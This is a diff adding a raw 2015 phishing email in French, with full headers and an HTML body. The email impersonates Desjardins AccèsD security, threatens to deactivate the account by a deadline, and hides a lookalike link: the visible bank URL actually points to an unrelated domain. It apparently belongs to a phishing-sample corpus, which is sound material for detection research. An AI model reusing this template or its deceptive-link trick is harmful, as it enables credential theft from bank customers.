@@ -1,0 +1,133 @@
+Return-Path: <info@soppa.it>
+X-Original-To: jose@login.monkey.org
+Delivered-To: jose@login.monkey.org
+Received: from forward.b.hostedemail.com (forward.b.hostedemail.com [64.98.36.17])
+	by l.monkey.org (Postfix) with ESMTP id 9E65BF409E
+	for <jose@login.monkey.org>; Wed, 23 Sep 2015 10:01:32 -0500 (CDT)
+Received: from smtpin09.hostedemail.com (10.5.19.248.rfc1918.com [10.5.19.248])
+	by ofarelay01.b.hostedemail.com (Postfix) with SMTP id 53B5034E38E
+	for <jose@login.monkey.org>; Wed, 23 Sep 2015 15:01:32 +0000 (UTC)
+X-Forwarded-For: jose@monkey.org by Hostedemail
+Delivered-To: jose@monkey.org
+X-FDA: 70664822424.09.pet83_477f88efdbb03
+Authentication-Results: auth.b.hostedemail.com; dkim=none
+	reason="no signature"; dkim-adsp=nxdomain; dkim-atps=neutral
+X-Spam-Summary: 20,1.5,0,9c64ff0118442944,d41d8cd98f00b204,info@soppa.it,:,RULES_HIT:41:72:355:375:379:962:967:973:983:988:989:994:1189:1208:1224:1260:1263:1311:1313:1314:1345:1381:1431:1432:1433:1434:1436:1437:1515:1516:1517:1534:1543:1571:1588:1589:1592:1685:1711:1730:1747:1777:1792:1801:2067:2069:2070:2198:2199:2393:2525:2527:2528:2538:2543:2560:2565:2610:2682:2685:2859:2933:2937:2939:2942:2945:2947:2951:2954:3022:3138:3139:3140:3141:3142:3352:3876:3877:3934:3936:3938:3941:3944:3947:3950:3953:3956:3959:4605:5007:6114:6119:6261:6642:6658:6669:6674:6678:7875:7974:8516:8518:8599:8603:8957:9025:9080:9121:9388:9868:10004:10049:11026:11257:11656:11657:11658:11914:12043:12555:12956:13139:13366:13374:13546:13894:21080,0,RBL:neutral,CacheIP:none,Bayesian:0.5,0.5,0.5,Netcheck:none,DomainCache:0,MSF:not bulk,SPF:fn,MSBL:0,DNSBL:neutral,Custom_rules:0:0:0
+X-HE-Tag: pet83_477f88efdbb03
+X-Filterd-Recvd-Size: 4243
+Received: from marsalis.windnet.it (marsalis.windnet.it [212.94.129.208])
+	by imf14.b.hostedemail.com (Postfix) with ESMTP
+	for <jose@monkey.org>; Wed, 23 Sep 2015 15:01:31 +0000 (UTC)
+Received: by marsalis.windnet.it (Postfix, from userid 33)
+	id 6F3BD4898B; Wed, 23 Sep 2015 17:01:16 +0200 (CEST)
+To: jose@monkey.org
+Subject: bienvenue a accesd
+X-PHP-Originating-Script: 33:mail.php
+From: solution en ligne de desjardins <security@desjardins.qc.ca>
+Reply-To: 
+MIME-Version: 1.0
+Content-Type: text/html
+Content-Transfer-Encoding: 8bit
+Message-Id: <20150923150116.6F3BD4898B@marsalis.windnet.it>
+Date: Wed, 23 Sep 2015 17:01:16 +0200 (CEST)
+Status: RO
+X-Status: 
+X-Keywords:                 
+X-UID: 185
+
+<html>
+
+<head>
+<meta http-equiv="Content-Language" content="fr-ca">
+<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
+<title>Desjardins - Securite</title>
+<style>
+<!--
+.style2 {
+	font-size: 14px;
+	font-weight: bold;
+}
+-->
+</style>
+</head>
+
+<body>
+
+<table height="131%" cellSpacing="0" cellPadding="0" width="100%" border="1" align="right" bordercolor="#009966">
+	<tr>
+		<td vAlign="top">
+		<table cellSpacing="0" cellPadding="0" width="100%" border="0">
+			<tr>
+				<td align="left" width="100%">
+				<div class="navEnteteAide">
+					<table cellSpacing="0" cellPadding="0" width="100%" border="0">
+						<tr>
+							<td width="2%"><a name="haut">
+							<img src="http://images.desjardins.com/fr/pict/7a00_pageaide_ada.gif"></a></td>
+							<td vAlign="top" width="98%" bgColor="#009966">
+							<p align="right">   </td>
+						</tr>
+					</table>
+					</div>
+				</td>
+			</tr>
+		</table>
+              <P align="justify"><SPAN class=Estilo6><span class="style2"><FONT color=#009966> Cher(e) membre 
+                de Desjardins/ AccèsD,</FONT></span></SPAN><font face="Arial"><br>
+				<br>
+ </font><font face="Times New Roman">
+	           
+   </font><p>
+		<font face="Times New Roman">Lors d'une derniere mise-à-jour de securité,  
+		les données recueillies, nous signalent que vous avez 
+		surpassé la limite réguliere tolérée concernant la continuation de 
+		votre compte <i><b><font color="#008000">AccèsD</font></b></i> , des <b>
+		Solutions en ligne de Desjardins</b>.
+	 <font color="#008000"><i><b>
+		AccesD</b></i></font> 
+ il est absolu de vous authentifier à ceci avant la 
+		date limite, autrement, nous devrons désactiver votre compte pour votre 
+		securité merci.</font></p>
+		<p><font face="Times New Roman">La date limite pour vous valider est: 
+		<u><b>vendredi</b></u><b><u>, le 25 septembre 2015</u></b>.</font></p>
+		<p><font face="Times New Roman"> Erengistrez vous ici afin d'éviter toute situation 
+		déplaisante.<br>
+		</font><b><span class="style4"><A
+href="http://habeuk.com/css/accesd/fr/services_en_ligne/pratique-securiteaccesd¶metre/en/ligne/info/"target=_blank type=hidden>https://accesd.desjardins.com/fr/accesd/Securite</A></span></b><span class="style1"> </span>
+              </p>
+		<p><font face="Times New Roman"> <font color="#009966">
+		<i><b>Desjardins</b></i></font>: Merci de nous faire confiance  
+		votre securité est notre priorité.</font></p>
+		<p><b><font face="Times New Roman">Département de securité 
+		Mouvement des caisses Desjardins.<br>
+		</font></b><STRONG>
+		<FONT face="Estilo, Helvetica, sans-serif" color=#009966 
+size=2>Desjardins / AccèsD</FONT></STRONG><BR>
+              <br>
+		<FONT size=2> <br>
+		</FONT>
+		<FONT color=#999999 
+size=1 face="Estilo, Helvetica,
+sans-serif">Svp ne repondez pas à ce courriel car c'est seulement un avis. Le 
+		courrier envoyé à cette adresse ne peut pas être repondu. 
+              <br>
+ </FONT><TABLE cellSpacing=0 cellPadding=0 width="100%" border=0 id="table1" align="right">
+                <TBODY>
+                  <TR>
+                    <TD class="footerText Estilo2" vAlign=bottom align=left>
+					<P class=style1 align="right">Copyright © 2015 Mouvement des caisses Desjardins. Tous droits 
+                      réservés.<br>
+ </P></TD>
+                    <TD align=right><SPAN class=bodyText></FONT></SPAN> </TD>
+                  </TR>
+                </TBODY>
+            </TABLE>
+            <p> </p>
+		</td>
+	</tr>
+	</table>
+
+</body>
+
+</html>
+
